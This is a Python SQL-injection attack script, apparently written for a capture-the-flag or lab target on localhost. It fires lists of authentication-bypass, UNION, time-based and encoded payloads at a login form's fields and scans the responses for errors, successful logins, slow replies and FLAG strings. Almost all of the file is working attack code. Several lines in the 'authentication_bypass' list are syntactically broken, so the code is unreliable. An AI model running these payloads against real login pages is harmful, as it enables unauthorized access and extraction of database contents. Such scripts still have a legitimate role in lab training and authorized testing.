import requests
import urllib.parse
import time
import re

# Configuration
TARGET_URL = "http://127.0.0.1:8080/login.php"
COOKIE = {"PHPSESSID": "adf118a2717e83ee6455ea878ebb507e"}

# Common form field names to test
FIELD_COMBINATIONS = [
    ("username", "password"),
    ("user", "pass"),
    ("uname", "pwd"),
    ("login", "password"),
    ("email", "password")
]

# Comprehensive payload collection
payloads = {
    "basic_bypass": [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or 1=1#",
        "' or 1=1--",
        "' OR 1=1/*",
        "') OR '1'='1--",
        "') OR '1'='1/*",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "1' OR '1'='1",
        "1' OR 1 -- -",
        "'OR 1=1--",
        "' OR 1=1 -",
        "' OR 1=1#",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "') OR ('1'='1'/*"
    ],
    "union_injection": [
        "' UNION SELECT 1,2--",
        "' UNION SELECT null,null--",
        "' UNION SELECT version(),user()--",
        "' UNION SELECT database(),@@version--",
        "1' UNION SELECT 1,2,3--",
        "1' UNION SELECT null,null,null--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT @@version,USER(),DATABASE(),@@hostname--"
    ],
    "comment_variants": [
        "' OR 1=1-- ",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 1=1;%00",
        "admin'-- ",
        "admin' #",
        "admin'/*"
    ],
    "encoded_payloads": [
        "%27%20OR%20%271%27%3D%271",  # URL encoded
        "%2527%20OR%20%25271%2527%253D%2527%25271",  # Double URL encoded
        "%27%09OR%09%271%27%3D%271",  # URL + tab
        "%27%0D%0AOR%0D%0A%271%27%3D%271",  # URL + newline
        "%%27%%20OR%%20%%271%%27%%3D%%271"  # Double percent
    ],
    "time_based": [
        "' OR SLEEP(5)--",
        "' OR IF(1=1,SLEEP(5),0)--",
        "1' OR BENCHMARK(2000000,MD5(NOW()))--",
        "' OR pg_sleep(5)--",
        "' WAITFOR DELAY '00:00:05'--"
    ],
    "authentication_bypass": [
        "'=',")
        "'LIKE',")
        "'=0--+"),
        "' OR 1=1 LIMIT 1--",
        "' OR '1'='1' AND '1'='1'--",
        "' AND 1=0 UNION SELECT 'admin', 'password', 1--"
    ]
}

# Response analysis functions
def analyze_response(response, payload, field_pair):
    """Analyze response for SQL injection indicators"""
    analysis = {
        "status_code": response.status_code,
        "content_length": len(response.text),
        "response_time": response.elapsed.total_seconds(),
        "cookies": dict(response.cookies),
        "has_redirect": bool(response.history),
        "redirect_url": response.url if response.history else None,
        "error_indicators": [],
        "success_indicators": [],
        "flags": []
    }
    
    # Check for error messages
    error_patterns = [
        r"SQL syntax",
        r"mysql",
        r"SQLi",
        r"database error",
        r"sql",
        r"ORA-",
        r"PostgreSQL",
        r"SQLite",
        r"SQLSTATE",
        r"syntax error",
        r"unterminated quoted string"
    ]
    
    for pattern in error_patterns:
        if re.search(pattern, response.text, re.I):
            analysis["error_indicators"].append(pattern)
    
    # Check for success indicators
    success_patterns = [
        r"welcome",
        r"dashboard",
        r"logged in",
        r"success",
        r"admin",
        r"profile",
        r"logout"
    ]
    
    for pattern in success_patterns:
        if re.search(pattern, response.text, re.I):
            analysis["success_indicators"].append(pattern)
    
    # Extract flags
    flag_matches = re.findall(r'FLAG{[^}]+}', response.text)
    if flag_matches:
        analysis["flags"] = flag_matches
    
    return analysis

def test_payload(payload, field_pair):
    """Test a specific payload on both fields"""
    username_field, password_field = field_pair
    
    # Test payload in username field
    data1 = {
        username_field: payload,
        password_field: "password123"
    }
    
    # Test payload in password field
    data2 = {
        username_field: "admin",
        password_field: payload
    }
    
    # Test payload in both fields
    data3 = {
        username_field: payload,
        password_field: payload
    }
    
    results = []
    
    try:
        # Test username field
        resp1 = requests.post(TARGET_URL, data=data1, cookies=COOKIE, allow_redirects=False, timeout=10)
        results.append(analyze_response(resp1, f"{payload}@{username_field}", field_pair))
        
        # Test password field
        resp2 = requests.post(TARGET_URL, data=data2, cookies=COOKIE, allow_redirects=False, timeout=10)
        results.append(analyze_response(resp2, f"{payload}@{password_field}", field_pair))
        
        # Test both fields
        resp3 = requests.post(TARGET_URL, data=data3, cookies=COOKIE, allow_redirects=False, timeout=10)
        results.append(analyze_response(resp3, f"{payload}@both_fields", field_pair))
        
    except Exception as e:
        print(f"[!] Error testing payload {payload}: {e}")
    
    return results

# Main testing loop
print(f"[*] Starting SQL injection tests on {TARGET_URL}")
print(f"[*] Session cookie: PHPSESSID={COOKIE['PHPSESSID']}")
print(f"[*] Testing {len(FIELD_COMBINATIONS)} field name combinations")
print(f"[*] Total payloads to test: {sum(len(v) for v in payloads.values())}")
print("="*80)

all_results = []

# Test each field combination
for field_pair in FIELD_COMBINATIONS:
    print(f"\n[+] Testing field combination: {field_pair[0]} / {field_pair[1]}")
    print("-"*80)
    
    # Test each payload category
    for category, payload_list in payloads.items():
        print(f"\n[+] Testing {category.replace('_', ' ').title()} payloads...")
        
        for payload in payload_list:
            results = test_payload(payload, field_pair)
            
            for result in results:
                # Check for anomalies
                is_interesting = False
                if result["flags"]:
                    print(f"[!] FLAG FOUND with payload: {payload}")
                    print(f"[!] Flag value: {result['flags']}")
                    is_interesting = True
                
                if result["error_indicators"]:
                    print(f"[!] SQL Error detected with payload: {payload}")
                    print(f"[!] Error indicators: {result['error_indicators']}")
                    is_interesting = True
                
                if result["success_indicators"]:
                    print(f"[!] Success indicators with payload: {payload}")
                    print(f"[!] Success patterns: {result['success_indicators']}")
                    is_interesting = True
                
                if result["response_time"] > 4.5:  # Potential time-based blind
                    print(f"[!] Slow response ({result['response_time']:.2f}s) with: {payload}")
                    is_interesting = True
                
                if result["has_redirect"]:
                    print(f"[!] Redirect detected with: {payload}")
                    is_interesting = True
                
                if result["cookies"]:
                    print(f"[!] New cookies set with: {payload}")
                    print(f"[!] Cookies: {result['cookies']}")
                    is_interesting = True
                
                if is_interesting:
                    print(f"    Status: {result['status_code']} | Length: {result['content_length']}B | Time: {result['response_time']:.2f}s")
                    print(f"    Field: {field_pair[0]}/{field_pair[1]}")
                    all_results.append({
                        "payload": payload,
                        "category": category,
                        "field_pair": field_pair,
                        "analysis": result
                    })

print("\n" + "="*80)
print("[*] Testing complete!")
print(f"[*] Total interesting results found: {len(all_results)}")

# Summary of findings
if all_results:
    print("\n[+] Summary of interesting findings:")
    for idx, finding in enumerate(all_results, 1):
        print(f"\n{idx}. Category: {finding['category']}")
        print(f"   Payload: {finding['payload']}")
        print(f"   Field: {finding['field_pair']}")
        print(f"   Status: {finding['analysis']['status_code']}")
        print(f"   Length: {finding['analysis']['content_length']}B")
        print(f"   Time: {finding['analysis']['response_time']:.2f}s")
        
        if finding['analysis']['flags']:
            print(f"   FLAGS: {finding['analysis']['flags']}")
        if finding['analysis']['error_indicators']:
            print(f"   ERRORS: {finding['analysis']['error_indicators']}")
        if finding['analysis']['success_indicators']:
            print(f"   SUCCESS: {finding['analysis']['success_indicators']}")
        if finding['analysis']['cookies']:
            print(f"   COOKIES: {finding['analysis']['cookies']}")

else:
    print("\n[-] No interesting results found with the tested payloads.")
    print("[-] The application may have filters or use prepared statements.")

# Session handling analysis
print("\n" + "="*80)
print("[*] Session Handling Analysis:")
print(f"[*] Initial PHPSESSID: {COOKIE['PHPSESSID']}")

# Check if any response changed the session
session_changes = [r for r in all_results if r['analysis']['cookies']]
if session_changes:
    print(f"[+] Found {len(session_changes)} responses that modified cookies:")
    for change in session_changes:
        print(f"  - Payload: {change['payload']}")
        print(f"  - New cookies: {change['analysis']['cookies']}")
else:
    print("[-] No session cookie changes detected in any response.")
